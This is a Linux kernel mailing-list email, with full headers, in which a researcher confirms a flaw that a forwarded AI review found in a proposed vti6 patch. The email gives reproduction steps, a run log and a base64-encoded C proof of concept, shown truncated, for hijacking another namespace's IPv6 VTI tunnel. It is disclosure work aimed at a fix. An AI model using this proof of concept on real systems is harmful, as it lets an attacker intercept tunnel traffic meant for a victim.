Return-Path: <stable+bounces-242844-lists+stable=lfdr.de@vger.kernel.org>
Delivered-To: lists+stable@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id AKbMCvQz+GmxrQIAu9opvQ
	(envelope-from <stable+bounces-242844-lists+stable=lfdr.de@vger.kernel.org>)
	for <lists+stable@lfdr.de>; Mon, 04 May 2026 07:51:48 +0200
X-Original-To: lists+stable@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id 81AF84B8AFF
	for <lists+stable@lfdr.de>; Mon, 04 May 2026 07:51:47 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 9A7A83007F7C
	for <lists+stable@lfdr.de>; Mon,  4 May 2026 05:51:43 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 39782282F21;
	Mon,  4 May 2026 05:51:41 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="qC2moc/W"
X-Original-To: stable@vger.kernel.org
Received: from mail-wm1-f46.google.com (mail-wm1-f46.google.com [209.85.128.46])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 79A83199931
	for <stable@vger.kernel.org>; Mon,  4 May 2026 05:51:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.128.46
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1777873901; cv=pass; b=LH5Fkeykv5wuPHNnkquBvm/Be8O6ETwum7whftnSOFDQ4CgG0Gw4rzZHT27BG+ZIqu0ekgPyTAlM/ULHoO+PfoqTT13PcIRznjkIRo2cEUikG4DYyXd12S+68FBL45BOvmtL78ePoBeDssJkLEsEafes0rqz8/lOT7kP7c+9pU0=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1777873901; c=relaxed/simple;
	bh=BVdYpXJA2fRnEtBemjPxMgiu6hafojv3sK31MeNf51Y=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=cMM/7136paz3Z2uEfxzVOJ/Y+bRVXorBYh/wqwS96K60dT6kQJ9JVnxl97Ko/JjPHMbTDmMbiYDnb6/bzqMi3TD8xRkVuAiqacWyR13RWffMBoVBZwuWzGlBCysaPLZ76DSCNTgnle6Bl2Q+yiiHrcyKQYjJvcr5j52cj9S55Ks=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=qC2moc/W; arc=pass smtp.client-ip=209.85.128.46
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-wm1-f46.google.com with SMTP id 5b1f17b1804b1-488d2079582so39795155e9.2
        for <stable@vger.kernel.org>; Sun, 03 May 2026 22:51:39 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1777873898; cv=none;
        d=google.com; s=arc-20240605;
        b=J4VLn9ihpkLxMxqQA1SxflD2/NYM+MQSYLSYRv/FmgdhhBy6sOFsTP4dgyp2u3Mh/I
         y1qyrpPexdgAx6GWj/m9CN3A4yydxW73/BoECyevHxfyDSCWo5CCOGyz4M96XKpmzZxi
         I542P3xsrvG7L2w5QwJ1BHyW4lsDSJlz+ZqG3obtOBI01IpGs13zSbW8KABQqyy2QoZt
         YLDiSaHV8N0Sf/IJHqHl8dXPzzjPGD5zy0AiYyDo2EAz930O5kCmVp101tNNtqBaOeb7
         C3QH03MhC3GD4PTn9XfIhfeMIydovLNCoNf4ENSJ6HA99kPWTq4w81gtCMHUzS8gtGhu
         PmMQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:dkim-signature;
        bh=bM8fylGW4HqR6JbHnCAUFC9LY7HmFZ6vOJL/AciWKas=;
        fh=c4pHUEnc16v1ZUgcl5JbOlJQk5QYBC3ut2kk94FlDzE=;
        b=elNK11Xw7wNpPqRnn/SG/t1pBDXrVXfckPCYdQ/Q5qCKfh8D5sEohVwp1Rb8dp1e27
         /r5Ugk7SVRlQM/Nqa5iFqMqLI5hASJnqZiCzzXY+j1pE0hoHTcJPvjRjfrudf0tFiV1e
         H+4A0D4vVzm4BQzsknvIzWlqK3nrsijC1KV+MOMpkxbh9qaLIw8YvdesL67PgQbPw7fe
         SSc9d32yKSgaYzdEXeQoutpNe5gCIJItc/1cpQuRyjEhNghJJcU6J4Ef2L9xf6wEBeR/
         oZDd4s1kb7xnX2eH1YUm+XARWFuS5DLPZqgQSx98z4/Rw3ybjj60MaEW13yPyfZx6xm7
         JO8w==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1777873898; x=1778478698; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=bM8fylGW4HqR6JbHnCAUFC9LY7HmFZ6vOJL/AciWKas=;
        b=qC2moc/WdRhUwiNUR3eob8nxFi2SJ+jLHVUgkmh9q/ZQ6PlG+ba5tojZysZGzTFJ7E
         Xqf04EBDwrejce29YKlBqmADd0XVpEBOc4odQvYNt7068rFCKB551GL+obwfRftKyZWn
         nsLUsW2N4pPRTQ0eYM6c7v2BiA/eQoyPF5QSij3LgZfRyL+mAXcoWVMIpBg+cAOXSGbj
         i6HlvIY4hjLH2JH5V2PpqfSTSDyKXDUWXvNTCmJSDBIFGbvw3se1HiPmQGjUfWaDVERm
         tITRxSlleIU3ius2AhgvbDqY4j02k+1XIs9g2PQqZLTtkE1N1JSbK4/ELwx2SacB9ys1
         oG7A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1777873898; x=1778478698;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to;
        bh=bM8fylGW4HqR6JbHnCAUFC9LY7HmFZ6vOJL/AciWKas=;
        b=F/2EjQadQnFxkyFr39DB0oXn2KiBasQAEQ3BEbb9OQsWaST8SriDXzV3URaMKuZVrU
         hs6zS0wvNzri2Dtccgm7Kdfj23Vs4xTiYWabqa1KaOLY1K6g50URJKZeEKiRJCcVzk2P
         ZCII5BzLPi3Uwsn7U5acgf1y6PMNordLKYAP0PQt02hAmDk4chuaouTFrHbyigQ00InW
         a6jkvBpgJPkphsceVtmxBeMWDbcTHISMAOc31SmxhQov4UFS3sgup04DG3vIvvW/YVxs
         NLU6KQ+w3LBu4a7t0Et3RCgAxWsocnLQcO56ybJbQMzhklqgQbNWwSFxW4cixpc1API8
         eeig==
X-Forwarded-Encrypted: i=1; AFNElJ9VnLjTCkL79ArisXJVG+7xDIZ2H4VpohwNyJ/7OxV/ECPsDC+VC/wcki3EvHMQ7W7cNcybe4Q=@vger.kernel.org
X-Gm-Message-State: AOJu0Yzsusnnl2Eg2EgGl1BY1UfdS0ClRKx0CHkCQ5flkDo5ZhoSw+Fq
	FQnnAzGO03koTB+UhSC9+te2GF7jRgKxAvG/mn1GDRT5z4OBqNVcO4GFmzQnAv+ewW2uD/Bv6M/
	tsL1GCh6s8vnJQYVCrn21yg/MpPCcsWc=
X-Gm-Gg: AeBDieu83wbnPfWW30l2Rrc+juniLmB6SeA+oEx8GDR5Mtq6TXWqTQIWgLgZm4EFzcd
	3dZdiI2/zBxvrZuM6Jlr1OsqBSxj5FtcafH0lse5pFvZygOJKrFWc3SULu38Kb7xjqopmL7V59v
	2U2672MCygzYKVJsHHGV+7Z2w+ofwjAO40GMU9K3+X1o2pL+SIQXbMPssg1GLN6zBby2+dAtn5K
	+vw/do8fxxOSaLyUDY0jAY5UYLeesSgjhV1UJPh4yO/9r6Ti0t64pTWQP4CpRtdDObzPVe4Slj5
	pls82f1Wv3RCzY2BHg==
X-Received: by 2002:a05:600c:e41a:b0:48a:592c:e642 with SMTP id
 5b1f17b1804b1-48a9865f799mr107846645e9.18.1777873897695; Sun, 03 May 2026
 22:51:37 -0700 (PDT)
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260428110713.2550315-2-maoyixie.tju@gmail.com> <20260430011847.2344915-1-kuba@kernel.org>
In-Reply-To: <20260430011847.2344915-1-kuba@kernel.org>
From: Maoyi Xie <maoyixie.tju@gmail.com>
Date: Mon, 4 May 2026 13:51:25 +0800
X-Gm-Features: AVHnY4LY23a2BzmfM-r8FpfnaAAXrk56Ir6pWQyI148cl_nqAOgNryZEsRdryIM
Message-ID: <CAHPEe=HG6k9mr5iggK52NRgozWYBpo1F_wQEys1=mMpFGumWRQ@mail.gmail.com>
Subject: Re: [PATCH net 1/2] ip6: vti: Use ip6_tnl.net in vti6_changelink().
To: Jakub Kicinski <kuba@kernel.org>
Cc: netdev@vger.kernel.org, kuniyu@google.com, shaw.leon@gmail.com, 
	davem@davemloft.net, edumazet@google.com, pabeni@redhat.com, 
	dsahern@kernel.org, kuznet@ms2.inr.ac.ru, linux-kernel@vger.kernel.org, 
	stable@vger.kernel.org, security@kernel.org
Content-Type: multipart/mixed; boundary="00000000000020c41f0650f7868d"
X-Rspamd-Queue-Id: 81AF84B8AFF
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [0.44 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	MIME_BASE64_TEXT_BOGUS(1.00)[];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	MAILLIST(-0.15)[generic];
	MIME_BASE64_TEXT(0.10)[];
	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-242844-lists,stable=lfdr.de];
	RCVD_COUNT_THREE(0.00)[4];
	FREEMAIL_FROM(0.00)[gmail.com];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCPT_COUNT_TWELVE(0.00)[12];
	MIME_TRACE(0.00)[0:+,1:+,2:+,3:~];
	FROM_HAS_DN(0.00)[];
	DKIM_TRACE(0.00)[gmail.com:+];
	TO_DN_SOME(0.00)[];
	NEURAL_HAM(-0.00)[-0.290];
	MID_RHS_MATCH_FROMTLD(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[maoyixietju@gmail.com,stable@vger.kernel.org];
	FREEMAIL_CC(0.00)[vger.kernel.org,google.com,gmail.com,davemloft.net,redhat.com,kernel.org,ms2.inr.ac.ru];
	TAGGED_RCPT(0.00)[stable];
	MISSING_XM_UA(0.00)[];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	HAS_ATTACHMENT(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,mail.gmail.com:mid]

--00000000000020c41f0650f7868d
Content-Type: text/plain; charset="UTF-8"

On 4/30/26, Jakub Kicinski wrote (forwarding AI review):
> Because the collision check occurs in the new namespace (dev_net(dev)), but
> vti6_update() now modifies the original namespace's hash table (t->net),
> could an attacker in the new namespace configure their tunnel to perfectly
> match the parameters of an existing victim tunnel in the original namespace?
>
> Since the check in the new namespace finds no collision, it seems it bypasses
> the error check. Then vti6_update() prepends the attacker's tunnel
> into the original namespace's hash table, which might allow intercepting or
> hijacking traffic destined for the victim tunnel.

Confirmed empirically. PoC reproduces on a v7.0 kernel with the
posted 1/2 patch applied.

Setup:
  1. Real init_net root creates a victim tunnel "vti_victim" with
     laddr=fc00::1 raddr=fc00::a in init_net. An attacker tunnel
     "vti_attacker" with different params (laddr=fc00::100
     raddr=fc00::200) also in init_net.
  2. fork() a child that unshare(CLONE_NEWUSER | CLONE_NEWNET) and
     becomes "root" only in its own user_ns.
  3. Real root migrates vti_attacker into the child's netns via
     "ip link set vti_attacker netns <cpid>".
  4. Child issues SIOCCHGTUNNEL on vti_attacker with new params equal
     to vti_victim's (laddr=fc00::1 raddr=fc00::a).

Result on init_net's hash for params=fc00::1/fc00::a:

    [child] SIOCCHGTUNNEL succeeded
    [parent] SIOCGETTUNNEL on init_net's ip6_vti0 with
             params=fc00::1/fc00::a returns name='vti_attacker'

So vti6_locate(init_net, victim_params, 0) now returns the attacker's
tunnel rather than the victim's. The mechanics match the review:

  - vti6_siocdevprivate runs net = dev_net(dev) = child_netns.
  - vti6_locate(child_netns, victim_params) finds nothing.
  - else branch: t = netdev_priv(attacker_dev).
  - vti6_update(t, victim_params) under the 1/2 patch operates on
    t->net = init_net:
      vti6_tnl_unlink(init_net's ip6n, t)   ; t was linked there
      vti6_tnl_change(t, victim_params)
      vti6_tnl_link(init_net's ip6n, t)     ; prepend at head
  - init_net's bucket-for-victim_params chain is now
        attacker (head) -> victim
  - Subsequent matches in init_net resolve to the attacker.

Once an inbound xfrm packet matches victim_params in init_net, the
attacker's tunnel handles rcv/xmit, with t->dev still in the child
netns. So packets destined for the victim are delivered through
the attacker's dev in a netns the attacker fully controls.

Switching vti6_siocdevprivate() to use t->net for the collision
check (or doing the check after vti6_update() under the same lock
that vti6_update is already serialised by) closes the gap, mirroring
what 1/2 already does for vti6_changelink and vti6_update.

Happy to send a follow-up patch if you would prefer me to take it
on, or to wait for v2 of the series. Whichever works for you.

PoC source and the run output above are in poc_vti6_hijack.c and
poc_log.txt, attached.

Best regards,
Maoyi
Nanyang Technological University
https://maoyixie.com/

--00000000000020c41f0650f7868d
Content-Type: text/plain; charset="US-ASCII"; name="poc_log.txt"
Content-Disposition: attachment; filename="poc_log.txt"
Content-Transfer-Encoding: base64
Content-ID: <f_moqs4tm61>
X-Attachment-Id: f_moqs4tm61

WypdIENsZWFuIHByaW9yIHR1bm5lbHMgKGJlc3QgZWZmb3J0KQpbIV0gY21kICdpcCBsaW5rIGRl
bCB2dGlfdmljdGltIDI+L2Rldi9udWxsJyByYz0yNTYKWyFdIGNtZCAnaXAgbGluayBkZWwgdnRp
X2F0dGFja2VyIDI+L2Rldi9udWxsJyByYz0yNTYKWypdIENyZWF0ZSB2aWN0aW0gdHVubmVsIHZ0
aV92aWN0aW0gd2l0aCBsYWRkcj1mYzAwOjoxIHJhZGRyPWZjMDA6OmEKWypdIENyZWF0ZSBhdHRh
Y2tlciB0dW5uZWwgdnRpX2F0dGFja2VyIHdpdGggbGFkZHI9ZmMwMDo6MTAwIHJhZGRyPWZjMDA6
OjIwMApbY2hpbGRdIHVpZD0wIG5ldG5zPW5ldDpbNDAyNjUzMjI2MV0KW3BhcmVudF0gbWlncmF0
aW5nIHZ0aV9hdHRhY2tlciB0byBjaGlsZCBuZXRucyAocGlkPTQxNykKW2NoaWxkXSBhdHRhY2tl
ciB0dW5uZWwgbWlncmF0ZWQgdG8gbXkgbmV0bnMKMTM6IHZ0aV9hdHRhY2tlckBOT05FOiA8UE9J
TlRPUE9JTlQsTk9BUlA+IG10dSAxNDYwIHFkaXNjIG5vb3Agc3RhdGUgRE9XTiBtb2RlIERFRkFV
TFQgZ3JvdXAgZGVmYXVsdCBxbGVuIDEwMDAKW2NoaWxkXSBTSU9DQ0hHVFVOTkVMOiBjaGFuZ2Ug
dnRpX2F0dGFja2VyIHBhcmFtcyB0byB2aWN0aW0ncyAobGFkZHI9ZmMwMDo6MSByYWRkcj1mYzAw
OjphKQpbY2hpbGRdIFNJT0NDSEdUVU5ORUwgc3VjY2VlZGVkCgpbKl0gVmVyaWZpY2F0aW9uOiBT
SU9DR0VUVFVOTkVMIGluIGluaXRfbmV0IG9uIHBhcmFtcz1mYzAwOjoxL2ZjMDA6OmEKW3BhcmVu
dF0gU0lPQ0dFVFRVTk5FTCByZXR1cm5lZCB0dW5uZWwgbmFtZT0ndnRpX2F0dGFja2VyJwoKKioq
IEhJSkFDSyBDT05GSVJNRUQ6IGluaXRfbmV0J3MgdnRpNiBoYXNoIGZvciBwYXJhbXM9ZmMwMDo6
MS9mYzAwOjphIG5vdyByZXNvbHZlcyB0byBhdHRhY2tlciBkZXYgJ3Z0aV9hdHRhY2tlcicgKHdh
cyAndnRpX3ZpY3RpbScpLiBDcm9zcy1uZXRucyB0cmFmZmljLWhpamFjayB3aW5kb3cgaXMgcmVh
bC4gKioqCg==
--00000000000020c41f0650f7868d
Content-Type: application/octet-stream; name="poc_vti6_hijack.c"
Content-Disposition: attachment; filename="poc_vti6_hijack.c"
Content-Transfer-Encoding: base64
Content-ID: <f_moqs4tlu0>
X-Attachment-Id: f_moqs4tlu0

LyoKICogUG9DIGZvciBjcm9zcy1uZXRucyB2dGk2IHRyYWZmaWMtaGlqYWNrIHdpbmRvdyBvcGVu
ZWQgYnkKICogdnRpNl9jaGFuZ2VsaW5rL3Z0aTZfdXBkYXRlIGZpeCB3aGVuIHZ0aTZfc2lvY2Rl
dnByaXZhdGUoKSBpcyBsZWZ0CiAqIHVzaW5nIGRldl9uZXQoZGV2KSBmb3IgY29sbGlzaW9uIGNo
ZWNrLgogKgogKiBTZXR1cCAoYWxsIHJ1biBieSByZWFsIGluaXRfbmV0IHJvb3QpOgogKiAgIDEu
IENyZWF0ZSB2aWN0aW0gdnRpNiB0dW5uZWwgVl9ERVYgaW4gaW5pdF9uZXQgd2l0aCBwYXJhbXMg
UF9WLgogKiAgIDIuIENyZWF0ZSBhdHRhY2tlciB2dGk2IHR1bm5lbCBBX0RFViBpbiBpbml0X25l
dCB3aXRoIERJRkZFUkVOVCBwYXJhbXMgUF9BLgogKiAgIDMuIGZvcmsoKSBjaGlsZDsgY2hpbGQg
dW5zaGFyZShDTE9ORV9ORVdVU0VSIHwgQ0xPTkVfTkVXTkVUKTsKICogICAgICB3cml0ZXMgMC1t
YXBwZWQgdWlkX21hcCBmb3IgZmFrZS1yb290IGluIGNoaWxkIHVzZXJfbnMuCiAqICAgNC4gUmVh
bCByb290IG1pZ3JhdGVzIEFfREVWIGludG8gY2hpbGQncyBuZXRuczogaXAgbGluayBzZXQgQV9E
RVYgbmV0bnMgPENQSUQ+LgogKgogKiBUcmlnZ2VyIChydW4gYnkgY2hpbGQgYXMgZmFrZS1yb290
IGluIHVzZXJfbnMgKyBjaGlsZCBuZXRucyk6CiAqICAgNS4gT3BlbiBBRl9JTkVUNiBTT0NLX0RH
UkFNLCBpc3N1ZSBTSU9DQ0hHVFVOTkVMIG9uIEFfREVWIHdpdGggcGFyYW1zID0gUF9WLgogKgog
KiBPbiBhIHY3LjAga2VybmVsIHdpdGggdGhlIGJ1Zy0jMSBmaXggYXBwbGllZCB0byB2dGk2X3Vw
ZGF0ZSgpCiAqIGJ1dCB2dGk2X3Npb2NkZXZwcml2YXRlKCkgc3RpbGwgdXNpbmcgZGV2X25ldChk
ZXYpOgogKiAgIC0gdnRpNl9sb2NhdGUobmV0PWRldl9uZXQoQV9ERVYpPWNoaWxkX25ldG5zLCBQ
X1YsIDApIGZpbmRzIG5vdGhpbmcKICogICAgIChWIGlzIGluIGluaXRfbmV0LCBub3QgY2hpbGRf
bmV0bnMpLgogKiAgIC0gZWxzZSBicmFuY2g6IHQgPSBuZXRkZXZfcHJpdihBX0RFVikgPSBhdHRh
Y2tlciB0dW5uZWwuCiAqICAgLSB2dGk2X3VwZGF0ZSh0LCBQX1YsIDApIG9wZXJhdGVzIG9uIHQt
Pm5ldCA9IGluaXRfbmV0OgogKiAgICAgICB2dGk2X3RubF91bmxpbmsoaW5pdF9uZXQncyB2dGk2
X25ldCwgdCkgIDsgdCB3YXMgbGlua2VkIHRoZXJlCiAqICAgICAgIHZ0aTZfdG5sX2NoYW5nZSh0
LCBQX1YpICAgICAgICAgICAgICAgICAgOyB0LT5wYXJtcyA9IFBfVgogKiAgICAgICB2dGk2X3Ru
bF9saW5rKGluaXRfbmV0J3MgdnRpNl9uZXQsIHQpICAgIDsgcHJlcGVuZCB0byBpbml0X25ldCdz
IGJ1Y2tldCBmb3IgUF9WCiAqICAgICBOb3cgaW5pdF9uZXQncyBidWNrZXQtZm9yLVBfViBjaGFp
biBpczogW3QgKGF0dGFja2VyLCBoZWFkKV0gLT4gW1YgKHZpY3RpbSldLgogKgogKiBWZXJpZmlj
YXRpb24gKHJlYWwgaW5pdF9uZXQgcm9vdCk6CiAqICAgNi4gU0lPQ0dFVFRVTk5FTCBvbiBpbml0
X25ldCdzIGZiX3RubF9kZXYgKGlwNl92dGkwKSB3aXRoIHBhcmFtcz1QX1YuCiAqICAgICAgS2Vy
bmVsIHdhbGtzIHZ0aTZfbG9jYXRlKGluaXRfbmV0LCBQX1YsIDApIGFuZCByZXR1cm5zIHRoZSBo
ZWFkIG9mCiAqICAgICAgdGhlIGNoYWluLiBUaGUgcmV0dXJuZWQgbmFtZSBmaWVsZCB0ZWxscyB1
cyB3aGljaCB0dW5uZWwgIndvbiI6CiAqICAgICAgICAgInZ0aV92aWN0aW0iICAgLT4gbm8gaGlq
YWNrCiAqICAgICAgICAgInZ0aV9hdHRhY2tlciIgLT4gSElKQUNLIENPTkZJUk1FRAogKgogKiBC
dWlsZDogZ2NjIHBvY192dGk2X2hpamFjay5jIC1vIHBvY192dGk2X2hpamFjawogKiBSdW4gYXMg
cmVhbCByb290IGluIGluaXRfbmV0LgogKi8KI2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8
c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRl
IDx1bmlzdGQuaD4KI2luY2x1ZGUgPGVycm5vLmg+CiNpbmNsdWRlIDxmY250bC5oPgojaW5jbHVk
ZSA8c2NoZWQuaD4KI2luY2x1ZGUgPHNpZ25hbC5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CiNpbmNs
dWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvaW9jdGwuaD4KI2luY2x1ZGUgPHN5cy93
YWl0Lmg+CiNpbmNsdWRlIDxsaW51eC9pZi5oPgojaW5jbHVkZSA8bGludXgvaXA2X3R1bm5lbC5o
PgojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPgojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+CgovKiBTSU9D
REVWUFJJVkFURSBmYW1pbHkgZm9yIHZ0aTYgKi8KI2lmbmRlZiBTSU9DQUREVFVOTkVMCiNkZWZp
bmUgU0lPQ0FERFRVTk5FTCAgICAoU0lPQ0RFVlBSSVZBVEUgKyAxKQojZGVmaW5lIFNJT0NERUxU
VU5ORUwgICAgKFNJT0NERVZQUklWQVRFICsgMikKI2RlZmluZSBTSU9DQ0hHVFVOTkVMICAgIChT
SU9DREVWUFJJVkFURSArIDMpCiNkZWZpbmUgU0lPQ0dFVFRVTk5FTCAgICAoU0lPQ0RFVlBSSVZB
VEUgKyAwKQojZW5kaWYKCiNkZWZpbmUgVklDVElNX05BTUUgICAidnRpX3ZpY3RpbSIKI2RlZmlu
ZSBBVFRBQ0tFUl9OQU1FICJ2dGlfYXR0YWNrZXIiCgovKiB2aWN0aW0gcGFyYW1zOiBsYWRkcj1m
YzAwOjoxLCByYWRkcj1mYzAwOjphICovCnN0YXRpYyB2b2lkIHNldF92aWN0aW1fcGFyYW1zKHN0
cnVjdCBpcDZfdG5sX3Bhcm0yICpwKQp7CiAgICBtZW1zZXQocCwgMCwgc2l6ZW9mKCpwKSk7CiAg
ICBpbmV0X3B0b24oQUZfSU5FVDYsICJmYzAwOjoxIiwgJnAtPmxhZGRyKTsKICAgIGluZXRfcHRv
bihBRl9JTkVUNiwgImZjMDA6OmEiLCAmcC0+cmFkZHIpOwogICAgcC0+cHJvdG8gPSAwOyAvKiB1
bnNwZWMgKi8KICAgIHAtPmVuY2FwX2xpbWl0ID0gNDsKICAgIHAtPmhvcF9saW1pdCA9IDY0Owog
ICAgcC0+Zmxvd2luZm8gPSAwOwogICAgcC0+ZmxhZ3MgPSAwOwogICAgcC0+bGluayA9IDA7CiAg
ICBwLT5pX2tleSA9IDA7CiAgICBwLT5vX2tleSA9IDA7Cn0KCi8qIGF0dGFja2VyIHBhcmFtczog
ZGlmZmVyZW50IGxhZGRyL3JhZGRyIHNvIGl0IGxhbmRzIGluIGEgZGlmZmVyZW50IGJ1Y2tldCAq
LwpzdGF0aWMgdm9pZCBzZXRfYXR0YWNrZXJfcGFyYW1zKHN0cnVjdCBpcDZfdG5sX3Bhcm0yICpw
KQp7CiAgICBtZW1zZXQocCwgMCwgc2l6ZW9mKCpwKSk7CiAgICBpbmV0X3B0b24oQUZfSU5FVDYs
ICJmYzAwOjoxMDAiLCAmcC0+bGFkZHIpOwogICAgaW5ldF9wdG9uKEFGX0lORVQ2LCAiZmMwMDo6
MjAwIiwgJnAtPnJhZGRyKTsKICAgIHAtPnByb3RvID0gMDsKICAgIHAtPmVuY2FwX2xpbWl0ID0g
NDsKICAgIHAtPmhvcF9saW1pdCA9IDY0Owp9CgpzdGF0aWMgaW50IHJ1bl9jbWQoY29uc3QgY2hh
ciAqY21kKQp7CiAgICBpbnQgcmMgPSBzeXN0ZW0oY21kKTsKICAgIGlmIChyYyAhPSAwKQogICAg
ICAgIGZwcmludGYoc3RkZXJyLCAiWyFdIGNtZCAnJXMnIHJjPSVkXG4iLCBjbWQsIHJjKTsKICAg
IHJldHVybiByYzsKfQoKc3RhdGljIGludCBkb19jaGdfdHVubmVsKGNvbnN0IGNoYXIgKmlmbmFt
ZSwgc3RydWN0IGlwNl90bmxfcGFybTIgKm5ld19wKQp7CiAgICBzdHJ1Y3QgaWZyZXEgaWZyOwog
ICAgaW50IHMsIHJjOwogICAgcyA9IHNvY2tldChBRl9JTkVUNiwgU09DS19ER1JBTSwgMCk7CiAg
ICBpZiAocyA8IDApIHsgcGVycm9yKCJzb2NrZXQoQUZfSU5FVDYpIik7IHJldHVybiAtMTsgfQog
ICAgbWVtc2V0KCZpZnIsIDAsIHNpemVvZihpZnIpKTsKICAgIHN0cm5jcHkoaWZyLmlmcl9uYW1l
LCBpZm5hbWUsIElGTkFNU0laIC0gMSk7CiAgICBpZnIuaWZyX2lmcnUuaWZydV9kYXRhID0gKHZv
aWQgKiluZXdfcDsKICAgIC8qIHAtPm5hbWUgc2hvdWxkIGJlIHRoZSBkZXZpY2UncyBjdXJyZW50
IG5hbWU7IGJ1dCB2dGk2X3Bhcm1fZnJvbV91c2VyCiAgICAgKiBkb2Vzbid0IHN0cmljdGx5IHJl
cXVpcmUgaXQuIFNldCBpdCBqdXN0IHRvIGJlIHNhZmUuICovCiAgICBzdHJuY3B5KG5ld19wLT5u
YW1lLCBpZm5hbWUsIElGTkFNU0laIC0gMSk7CiAgICByYyA9IGlvY3RsKHMsIFNJT0NDSEdUVU5O
RUwsICZpZnIpOwogICAgY2xvc2Uocyk7CiAgICByZXR1cm4gcmM7Cn0KCnN0YXRpYyBpbnQgZG9f
Z2V0X3R1bm5lbF92aWFfZmIoc3RydWN0IGlwNl90bmxfcGFybTIgKndhbnRfcCwKICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICBzdHJ1Y3QgaXA2X3RubF9wYXJtMiAqb3V0X3ApCnsKICAg
IC8qIFNJT0NHRVRUVU5ORUwgb24gdGhlIGZhbGxiYWNrIGRldmljZSAiaXA2X3Z0aTAiIHBlcmZv
cm1zCiAgICAgKiB2dGk2X2xvY2F0ZShpbml0X25ldCwgd2FudF9wLCAwKS4gKi8KICAgIHN0cnVj
dCBpZnJlcSBpZnI7CiAgICBpbnQgcywgcmM7CiAgICBzID0gc29ja2V0KEFGX0lORVQ2LCBTT0NL
X0RHUkFNLCAwKTsKICAgIGlmIChzIDwgMCkgeyBwZXJyb3IoInNvY2tldChBRl9JTkVUNikiKTsg
cmV0dXJuIC0xOyB9CiAgICBtZW1zZXQoJmlmciwgMCwgc2l6ZW9mKGlmcikpOwogICAgc3RybmNw
eShpZnIuaWZyX25hbWUsICJpcDZfdnRpMCIsIElGTkFNU0laIC0gMSk7CiAgICAqb3V0X3AgPSAq
d2FudF9wOwogICAgLyogY2xlYXIgbmFtZSBmaWVsZCBzbyBrZXJuZWwgcmV0dXJucyB0aGUgdHVu
bmVsJ3MgYWN0dWFsIG5hbWUgKi8KICAgIG1lbXNldChvdXRfcC0+bmFtZSwgMCwgc2l6ZW9mKG91
dF9wLT5uYW1lKSk7CiAgICBpZnIuaWZyX2lmcnUuaWZydV9kYXRhID0gKHZvaWQgKilvdXRfcDsK
